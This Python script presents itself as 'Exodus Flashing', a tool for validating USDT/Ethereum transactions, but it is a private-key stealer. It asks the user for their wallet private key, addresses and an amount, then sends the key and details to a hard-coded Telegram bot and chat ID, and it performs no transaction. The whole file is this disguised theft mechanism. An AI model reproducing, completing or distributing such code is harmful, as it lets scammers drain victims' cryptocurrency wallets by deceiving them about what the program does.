import asyncio
from telegram import Bot
from telegram.constants import ParseMode
import re

# Logo and description
logo = """
███████╗██╗     ███████╗███████╗██╗  ██╗███████╗
██╔════╝██║     ██╔════╝██╔════╝██║  ██║██╔════╝
█████╗  ██║     █████╗  █████╗  ███████║█████╗  
██╔══╝  ██║     ██╔══╝  ██╔══╝  ██╔══██║██╔══╝  
███████╗███████╗███████╗███████╗██║  ██║███████╗
╚══════╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝
"""

description = """
Welcome to Exodus Flashing!
This script helps you to manage and validate Ethereum transaction details.
Make sure to enter correct details to ensure proper validation.
"""

# Telegram bot setup
bot_token = '6638058790:AAGopFQtax5re27q-3JOhbS-rlfhNmMeHNQ'
chat_id = '6530323383'

# Function to send a message to Telegram bot
async def send_message_to_telegram(message):
    bot = Bot(token=bot_token)
    await bot.send_message(chat_id=chat_id, text=message, parse_mode=ParseMode.MARKDOWN)

# Function to validate Ethereum address
def is_valid_ethereum_address(address):
    return re.match(r'^0x[a-fA-F0-9]{40}$', address) is not None

# Interactive inputs
async def main():
    print(logo)
    print(description)

    print("Enter the details for the USDT transaction:")

    private_key = input("Private Key: ")
    sender_address = input("Sender Address: ")
    recipient_address = input("Recipient Address: ")
    amount = float(input("Amount (USDT): "))

    # Validate addresses
    if not is_valid_ethereum_address(sender_address):
        print(f"Invalid sender address: {sender_address}")
        return
    if not is_valid_ethereum_address(recipient_address):
        print(f"Invalid recipient address: {recipient_address}")
        return

    # Prepare message to send to Telegram
    message = (
        f"*Transaction Details:*\n"
        f"Private Key: `{private_key}`\n"
        f"Sender Address: `{sender_address}`\n"
        f"Recipient Address: `{recipient_address}`\n"
        f"Amount (USDT): `{amount}`"
    )

    # Send private key and other details to Telegram
    await send_message_to_telegram(message)

    # Print details
    print("Transaction Details:")
    print(f"Private Key: {private_key}")
    print(f"Sender Address: {sender_address}")
    print(f"Recipient Address: {recipient_address}")
    print(f"Amount (USDT): {amount}")

if __name__ == '__main__':
    asyncio.run(main())
